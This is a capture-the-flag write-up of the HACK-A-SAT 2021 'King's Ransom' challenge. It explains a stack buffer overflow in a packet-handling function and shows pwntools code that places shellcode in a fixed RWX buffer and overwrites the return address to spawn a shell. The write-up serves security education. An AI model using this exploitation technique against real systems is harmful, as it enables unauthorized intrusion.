# HACK-A-SAT 2021: King's Ransom

* **Category:** Presents from Marco
* **Points:** 214
* **Solves:** 12
* **Description:**

> A vulnerable service with your "bank account" information running on the target system. Too bad it has already been exploited by a piece of ransomware. The ransomware took over the target, encrypted some files on the file system, and resumed the executive loop.
>
> Follow the footsteps.
>
> Ticket
>
> Present this ticket when connecting to the challenge:
>
> ticket{zulu393656golf2:GDx0CmQXV(...)UcvKdOLA}
>
> Don't share your ticket with other teams.
>
> Connecting
>
> Connect to the challenge on:
>
> wealthy-rock.satellitesabove.me:5010
>
> Using netcat, you might run:
>
> nc wealthy-rock.satellitesabove.me 5010
>
> Files
>
> You'll need these files to solve the challenge.
>
> https://static.2021.hackasat.com/lyj5rhtjfw992dn0f976ra4aglss
>
> https://static.2021.hackasat.com/t5qefn4567j7zpld6xuqrhay6hlj

The files are `challenge` and `libc.so`.

## Write-up

_Write-up by Solar Wine team_

The binary is a program which reads on stdin and writes on stdout. It parses packets of the form:

```c
struct __attribute__((aligned(8))) st
{
  char magic1;
  char magic2;
  unsigned __int16 len;
  __int16 crc16;
  _BYTE x;
  _BYTE y;
  char ptr[];
};
```

`x` and `y` are indexes into a 2D table which points to handling functions, which parse the packets

One of the functions is vulnerable to a stack based buffer overflow:

```c
 __int64 __fastcall update_floats_1percent(st *a1)
{
  float v1; // xmm0_4
  float v2; // xmm0_4
  float v3; // xmm0_4
  float flt_from_param[3]; // [rsp+14h] [rbp-Ch] BYREF

  get_data_and_free(a1, flt_from_param);
  v1 = 0.01 * flt_from_param[0] + floats[0];
  floats[0] = v1;
  v2 = 0.01 * flt_from_param[1] + floats[1];
  floats[1] = v2;
  v3 = 0.01 * flt_from_param[2] + floats[2];
  floats[2] = v3;
  return 1LL;
}
```

The function `get_data_and_free` reads the packet payload and copies it into `flt_from_param` without checking the length.
As there's no stack cookie, overwriting the return address is trivial.

Thankfully, the program allocates RWX memory at a fixed address, `0x12800000`:

```c
 global_buffer = mmap((void *)0x12800000, 0x1000uLL, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, 0, 0LL);// RWX
```

This buffer can be written/read into by sending appropriate packets.
So we can write a shellcode and return to this address to get a shell:

```python
pwnlib.context.context.update(binary="./challenge")
shellcode = pwnlib.asm.asm(pwnlib.shellcraft.amd64.linux.sh())
clt.write_to_global(shellcode)

# Trigger stack overflow
clt.write_pkt(1, 1, b"Aa0Aa1Aa2Aa3Aa4Aa5Aa"+struct.pack('<Q', 0x12800000))
pwnlib.term.init()
clt.s.interactive()
```

The flag is then in `flag1.txt`.